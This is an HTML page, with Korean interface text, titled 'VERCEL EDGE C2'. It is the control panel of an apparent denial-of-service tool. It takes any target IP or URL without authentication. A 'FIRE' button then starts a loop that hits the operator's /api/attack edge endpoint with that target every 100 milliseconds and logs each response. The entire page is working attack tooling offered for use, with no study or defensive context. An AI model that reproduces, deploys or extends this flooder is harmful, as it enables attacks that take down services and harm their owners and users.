<!DOCTYPE html>
<html>
<head>
    <title>VERCEL EDGE C2 - FINAL</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px; }
        input { background: #222; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 300px; margin-bottom: 20px; outline: none; }
        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; font-size: 1.1em; }
        button:hover { background: #0c0; box-shadow: 0 0 10px #0f0; }
        #log { margin-top: 20px; font-size: 1.2em; font-weight: bold; height: 200px; overflow-y: auto; background: #111; padding: 10px; }
    </style>
</head>
<body>
    <h1>[ VERCEL EDGE C2 ]</h1>
    <p>대상 IP 또는 URL 입력 (토큰 필요 없음):</p>
    <input type="text" id="target" placeholder="http://1.2.3.4" value="http://">
    <br>
    <button onclick="startAttack()">초고속 연사 시작 (FIRE)</button>
    <div id="log">상태: 대기 중...</div>

    <script>
        async function startAttack() {
            const target = document.getElementById('target').value;
            const logDiv = document.getElementById('log');
            logDiv.innerHTML = `<span style="color:yellow">공격 개시: ${target}</span><br>`;

            // 0.1초마다 Vercel 에지 엔진(/api/attack) 호출
            setInterval(async () => {
                try {
                    // GitHub API를 거치지 않고 내 Vercel 서버로 직접 쏨
                    const res = await fetch(`/api/attack?target=${target}`);
                    const text = await res.text();
                    const line = document.createElement('div');
                    line.innerText = `> ${new Date().toLocaleTimeString()} : ${text}`;
                    logDiv.prepend(line);
                } catch (e) {
                    console.error("연사 실패:", e);
                }
            }, 100); 
        }
    </script>
</body>
</html>
